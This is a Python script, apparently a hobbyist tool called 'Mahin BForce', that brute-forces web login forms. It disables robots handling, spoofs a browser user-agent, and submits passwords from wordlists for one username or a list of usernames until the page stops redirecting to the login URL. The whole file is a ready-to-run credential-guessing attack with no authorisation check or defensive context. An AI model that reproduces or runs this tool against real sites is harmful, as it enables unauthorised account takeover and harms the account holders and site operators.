######################################
#Copyright of Mahin Bin Hasan,2021   #
#https://www.facebook.com/root.mahin #
#https://www.youtube.com/Almahin     #
######################################

import mechanize
import pyfiglet 
import os
from platform import system
ban = """
  __  __       _     _         ____  ______                 
 |  \/  |     | |   (_)       |  _ \|  ____|                
 | \  / | __ _| |__  _ _ __   | |_) | |__ ___  _ __ ___ ___ 
 | |\/| |/ _` | '_ \| | '_ \  |  _ <|  __/ _ \| '__/ __/ _ \\
 | |  | | (_| | | | | | | | | | |_) | | | (_) | | | (_|  __/
 |_|  |_|\__,_|_| |_|_|_| |_| |____/|_|  \___/|_|  \___\___|
                                              --Version 1.2              
                                                            
"""
def banners():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')
    print(ban)

banners()
br = mechanize.Browser()
br.set_handle_equiv(False)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

url = str(input(" Enter Login Page Url: "))
#def doo(url):
if len(url) > 0:
    br.open(url)
    print("---------------Usefull Info -----------\n\n")
    for f in br.forms():
        print(f)
    print("-------------------------\n\n")
    input_fst = input("Please Enter Username Input Tag Name  :  ")
    input_scnd = input("Please Enter Password Input Tag Name : ")
    if len(input_fst) <= 0:
        print("|        Invalid Username Feild     ")
        exit()
    elif len(input_scnd) <= 0:
        print("Invalid Password Feild ")
        exit()
    else:
        test = input("You Know Username (y/n)")
        if test == "y":
            username = input(" Enter username: ")
            passlist = input(" Enter Password List Path Default (pass.txt Hit Enter) :")
            if not passlist:
                combos = open("pass.txt", "r")
                data = combos.read().splitlines()
            else:
                combos = open(passlist, "r")
                data = combos.read().splitlines()
            for x in data:
                #br.open(url)
                br.select_form(nr=0)
                br.form[''.join(input_fst)] = username
                br.form[''.join(input_scnd)] = x
                #br.form[''.join("language")] = ["English"]
                response = br.submit()
                if response.geturl() == url:
                    print("[-] WRONG PASSWORD = " + x)
                else:
                    print("[+] Password Found .. [+] Password = " + x)
                    break
                    #exit()
        else:
            user_file = input(" Enter the path of Username File (Default users.txt): ")
            passlist = input(" Enter Password List Path (Default pass.txt) :")
            if not passlist:
                combos = open("pass.txt", "r")
                data = combos.read().splitlines()
            else:
                combos = open(passlist, "r")
                data = combos.read().splitlines()
            if not user_file:
                print("Taking Default")
                file = open ("users.txt", "r")
                usr_data = file.read().splitlines()
            else:
                print("Loading Users Files")
                file = open (user_file, "r")
                usr_data = file.read().splitlines()
            for y in usr_data:
                print (" Chenking User " + y)    
                for x in data:
                    br.select_form(nr=0)
                    br.form[''.join(input_fst)] = y
                    br.form[''.join(input_scnd)] = x
                    response = br.submit()
                    if response.geturl() == url:
                        print(
                            " Cracking |+| WRONG PASSWORD = " + x + " For Username = " + y)
                    else:
                        print("--------------------------------------------------------------------------------------------------------")
                        print(" \t \t Correct password is = " + x  + " \t \t For Username = " + y)
                        print("-------------------------------------------------------------------------------------------------------- ")
                        break
            
            
else:
    print("---------------------------------------------")
    print("|\t \t  Invalid URL  \t \t|")
    print("--------------------------------------------- ")
    exit()
